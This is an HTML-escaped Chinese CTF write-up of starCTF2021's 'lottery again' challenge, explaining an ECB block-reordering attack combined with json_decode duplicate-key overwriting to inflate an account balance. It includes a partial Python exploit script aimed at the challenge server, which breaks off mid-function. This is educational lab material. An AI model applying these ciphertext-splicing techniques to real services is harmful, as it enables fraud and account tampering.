&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144048.png&#34; alt=&#34;image-20210119143535541&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;*ctf{Y0u_Are_t3e_Master_of_3he_Time!}&lt;/p&gt;
&lt;h3 id=&#34;lottery-again&#34;&gt;lottery again&lt;/h3&gt;
&lt;p&gt;考点：EBC重排攻击，json_decode&lt;/p&gt;
&lt;h4 id=&#34;题目分析-1&#34;&gt;题目分析&lt;/h4&gt;
&lt;p&gt;题目首先给了源码：&lt;a class=&#34;link&#34; href=&#34;https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/XCTF-starCTF2021/%5BstarCTF2021%5Dlottery%20again.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;source.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144055.png&#34; alt=&#34;image-20210118172658033&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;网站的功能是注册，登陆，buy lottery，每一个用户初始只有300，买一次彩票花100，获得金额是1~100，然而flag需要9999。&lt;/p&gt;
&lt;p&gt;打开源码，审计，主要功能在Http/Controller/LotteryController.php&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144108.png&#34; alt=&#34;image-20210118184827067&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;同时结合抓到的数据包，我们得知运作方式是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function buy()(生成一单lottery，返回对称加密后的enc)-&amp;gt;
function info()(客户端发送enc，服务端对称解密并且jsondecode，返回这单lottery的信息)-&amp;gt;
function charge()(接收客户端的enc，对称解密并且jsondecode，根据解密得到的user uuid找到用户信息，根据lottery uuid找到lottery信息，把lottery的钱加到user账户)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在&lt;code&gt;function buy()&lt;/code&gt;里面有这么几行代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$lottery&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Lottery&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;coin&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqrt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;random_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))]);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$serilized&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;
    &lt;span class=&#34;s1&#34;&gt;&amp;#39;lottery&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$lottery&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;uuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;uuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;s1&#34;&gt;&amp;#39;coin&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$lottery&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;coin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$enc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mcrypt_encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;MCRYPT_RIJNDAEL_256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LOTTERY_KEY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$serilized&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;MCRYPT_MODE_ECB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们可以看到他使用了EBC模式和&lt;code&gt;rijndael256&lt;/code&gt;来对&lt;code&gt;enc&lt;/code&gt;进行加密；&lt;/p&gt;
&lt;h4 id=&#34;ebc加密模式&#34;&gt;EBC加密模式&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144116.png&#34; alt=&#34;http://p3.qhimg.com/t01b53d433f418eb7da.png&#34;  /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ECB模式是所有模式中最简单的一种。明文分组和密文分组是一一对应的，如果明文分组有相同的那么最后的密文中也会有相同的密文分组。&lt;/p&gt;
&lt;p&gt;因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果，如图所示（翻转密文分组，那么明文分组也会被翻转）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;ecb块重排攻击&#34;&gt;ECB块重排攻击&lt;/h4&gt;
&lt;p&gt;前文说过，在块加密中ECB模式中每个块都是独立加密的。因此攻击者可以在未知密钥的情况下，对密文中的块进行重新排列，组合成合法的可解密的新密文。&lt;/p&gt;
&lt;p&gt;举一个例子，某CMS的cookie格式为DES-ECB加密后的数据，而明文格式如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;admin=0;username=pan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于DES使用的块大小是8字节，因此上述明文可以切分成三个块，其中&lt;code&gt;@&lt;/code&gt;为填充符号：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;admin=0;
username
=pan@@@@
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;假设我们可以控制自己的用户名（在注册时），那么有什么办法可以在不知道密钥的情况下将自己提取为管理员呢（即admin=1）？首先将用户名设置为&lt;code&gt;pan@@@@admin=1;&lt;/code&gt;，此时明文块的内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;admin=0;username=pan@@@@admin=1;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们所需要做的，就是在加密完成后，将服务器返回的cookie使用最后一个块替换第一个块，这样一来就获得了一个具有管理员权限的合法cookie了。&lt;/p&gt;
&lt;h4 id=&#34;回到题目&#34;&gt;回到题目&lt;/h4&gt;
&lt;p&gt;请求&lt;code&gt;/lottery/buy&lt;/code&gt;路由的时候，由于使用的是EBC模式的加密，每一块密文直接与明文对应&lt;/p&gt;
&lt;p&gt;而请求&lt;code&gt;/lottery/charge&lt;/code&gt;的时候服务端直接解密我们传过去的enc，根据lottery的uuid和user的uuid来把lottery的金额加入账户余额。&lt;/p&gt;
&lt;p&gt;利用这一点我们便可以注册多个账户，生成多个lottery的uuid并且通过把lottery的uuid拼接到请求&lt;code&gt;/lottery/charge&lt;/code&gt;时的enc，来让多个lottery的金额存到同一个user，刷钱。&lt;/p&gt;
&lt;p&gt;本题使用的是&lt;code&gt;MCRYPT_RIJNDAEL_256&lt;/code&gt;加密，&lt;code&gt;rijndael128&lt;/code&gt;与&lt;code&gt;aes&lt;/code&gt;相同，都是以128位为一个块加密，&lt;code&gt;rijndael256&lt;/code&gt;则是以256位为一个块，即32字节。&lt;/p&gt;
&lt;p&gt;对于一个enc而言：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;lottery&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;bb9c4db6-d339-4a26-9|397-caeb4bfe043e&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;157b58|a1-108b-47cc-abf4-fff1f903b05d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;coin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@@@@@@@@@@@@@@@@@@@@@@@&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;//@是填充&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到无论我们替换哪一块，都没有办法完全控制user或者lottery，但是我们可以把第一单lottery的1，2块加上第二单lottery的2，3，4块，构成类似于下面的payload：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;lottery&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1287901b-89d7-4b94-a|0d7-a7655d85800d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;157b58|397-caeb4bfe043e&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;157b58|a1-108b-47cc-abf4-fff1f903b05d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;coin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@@@@@@@@@@@@@@@@@@@@@@@&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;前面的user在json_decode之后会被后面的user所覆盖，形成了user不变而lottery任意控制的局面&lt;/p&gt;
&lt;p&gt;贴一个JrXnm师傅的exp：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;string&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;json&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;urllib.parse&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;quote&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;user_token&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Yu5PGq2I0jhZssXttlEaiBkNQXRrxzbD&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;user_uuid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ae4774be-2e44-49d2-82dc-6c69c57c4378&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;user_enc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;+Zza7U18mMFaHhYyrTaOr\/IubODmR8QF1yC01+0XIg3Ea0s5evdcMwcHHNovcM3pytuj4wsD2NFsMv1g+yjXfyEFlnH5hTkHnLKzkFc0dmHqydlPZNnijH8cHjiFVPKU4tKa3tbXh1v0ZTejYwnrwjeWiY89xrpsXSMn2CEt8bM=&amp;#34;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;cookie&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;s2&#34;&gt;&amp;#34;api_token&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_token&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://52.149.144.45:8080&amp;#34;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_random&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sample&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ascii_letters&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;digits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_random&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;asdasd&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/user/register&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;loads&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;login&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;asdasd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/user/login&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;loads&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;api_token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;api_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/user/info?api_token=&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;api_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;loads&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uuid: &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uuid&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;buy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;api_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;api_token&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;api_key&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/lottery/buy&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;#print(res.text)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;loads&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;enc&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
